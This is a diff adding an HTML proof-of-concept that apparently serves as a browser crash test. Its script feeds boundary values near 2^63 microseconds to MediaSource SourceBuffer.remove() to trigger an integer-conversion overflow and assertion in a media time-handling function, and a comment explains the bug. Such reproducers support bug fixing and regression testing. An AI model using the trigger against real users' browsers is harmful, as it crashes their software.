@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"></head>
+<body>
+<script>
+/*
+ * Trigger TimeUnit::FromSeconds boundary overflow via MSE SourceBuffer.remove()
+ *
+ * Bug in dom/media/TimeUnits.cpp, FromSeconds():
+ *   double inBase = aValue * static_cast<double>(aBase);
+ *   if (std::abs(inBase) > static_cast<double>(INT64_MAX)) return Infinity;
+ *   return TimeUnit(static_cast<int64_t>(std::round(inBase)), aBase);
+ *
+ * static_cast<double>(INT64_MAX) rounds UP to 2^63. The check uses strict >,
+ * so inBase == 2^63 passes. static_cast<int64_t>(round(2^63)) is UNDEFINED
+ * BEHAVIOR (2^63 > INT64_MAX). On x86-64 it produces INT64_MIN (negative infinity),
+ * corrupting the TimeUnit. The Interval(start, end) constructor asserts start <= end;
+ * with end = -Inf and start = 0, the assertion fires.
+ */
+
+(async function() {
+  if (!window.MediaSource) return;
+
+  // Find a supported MSE type
+  const types = [
+    'audio/webm; codecs="opus"',
+    'video/webm; codecs="vp8"',
+    'video/webm; codecs="vp9"',
+    'audio/mp4; codecs="mp4a.40.2"',
+    'video/mp4; codecs="avc1.42E01E"',
+    'audio/mp4; codecs="flac"',
+  ];
+  let mimeType = null;
+  for (const t of types) {
+    if (MediaSource.isTypeSupported(t)) { mimeType = t; break; }
+  }
+  if (!mimeType) return;
+
+  // Create MediaSource and SourceBuffer
+  const ms = new MediaSource();
+  const video = document.createElement('video');
+  video.src = URL.createObjectURL(ms);
+  document.body.appendChild(video);
+  await new Promise(r => ms.addEventListener('sourceopen', r));
+  const sb = ms.addSourceBuffer(mimeType);
+
+  // Critical boundary value: 2^63 / 10^6 ≈ 9223372036854.776
+  // This is the value where inBase = value * 10^6 ≈ 2^63 exactly,
+  // which passes the > check but causes UB in static_cast<int64_t>
+  const criticalValue = 9223372036854.776;
+
+  // Set duration large enough to allow the remove
+  try { ms.duration = criticalValue + 1; } catch(e) {}
+
+  // Trigger the bug: remove(0, criticalValue) calls
+  // TimeUnit::FromSeconds(criticalValue) which overflows
+  try {
+    sb.remove(0, criticalValue);
+    await new Promise(r => {
+      sb.addEventListener('updateend', r, { once: true });
+      sb.addEventListener('error', r, { once: true });
+      setTimeout(r, 500);
+    });
+  } catch(e) {}
+
+  // Try a few more boundary values
+  const vals = [
+    Math.pow(2, 63) / 1e6,
+    9223372036854.775,
+    1e15,
+    1e16,
+    Number.MAX_SAFE_INTEGER,
+  ];
+  for (const val of vals) {
+    try {
+      if (ms.readyState !== 'open' || sb.updating) break;
+      ms.duration = Math.abs(val) + 1;
+      sb.remove(0, val);
+      await new Promise(r => {
+        sb.addEventListener('updateend', r, { once: true });
+        sb.addEventListener('error', r, { once: true });
+        setTimeout(r, 300);
+      });
+    } catch(e) {}
+  }
+
+  video.remove();
+})();
+</script>
+</body>
+</html>
